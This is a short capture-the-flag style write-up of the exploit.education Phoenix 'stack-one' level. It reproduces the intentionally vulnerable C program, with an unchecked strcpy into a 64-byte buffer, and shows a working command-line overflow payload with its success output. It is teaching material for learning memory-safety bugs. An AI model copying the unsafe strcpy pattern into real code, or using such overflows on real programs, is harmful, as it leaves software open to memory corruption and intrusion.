بِسْمِ ٱللَّٰهِ | In the name of God

# Source code
Here is the source code of our [second challenge (stack one)](https://exploit.education/phoenix/stack-one/).
```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```
# Exploitation
Here, the same structure, with the same buffer size, and then we see that the first argument (the program name is the zeroth argument), is copied to this buffer with the `strcpy` function, which is not safe as it donesn't check the size of the data copied to the buffer, so it allow overflowing.
And we can see that we need to overwrite the `changeme` variable with a specfied value. 
Here the thing to note is that x86 architectures are little-endian, check [Endianness](https://en.wikipedia.org/wiki/Endianness).
So we need to povide the value in reverse order to be stored correct in memory, so when the CPU instructions will compare the `changeme` variable and the value, it will get the correct one.
Here's How I exploited:
```
user@phoenix-amd64:/opt/phoenix/i486$ ./stack-one $(python -c 'print "A"* 64 + "\x62\x59\x6c\x49"')
```
And I get:
```
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
